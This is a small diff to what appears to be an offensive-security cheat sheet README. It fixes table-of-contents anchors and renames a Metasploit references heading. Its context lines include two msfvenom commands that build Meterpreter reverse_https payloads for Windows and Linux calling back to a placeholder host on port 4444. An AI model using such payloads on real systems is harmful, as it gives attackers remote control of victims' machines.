@@ -73,7 +73,8 @@ Enjoy creating your own 🦠
 <br>
 
 # [MetaSploit](#Metasploit-1)
-- [Metasploit_Refs](#Msfvenom)
+- [Msfvenom](#Msfvenom)
+- [Metasploit_Refs](#Metasploit_Refs)
 
 <br>
 
@@ -1349,9 +1350,9 @@ msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -
 msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
 ```
 
-### Metasploit_Ref
+### Metasploit_Refs
 
-- [Metasploit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)
+- [Metasploit_Refs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)
 
 <br>
 
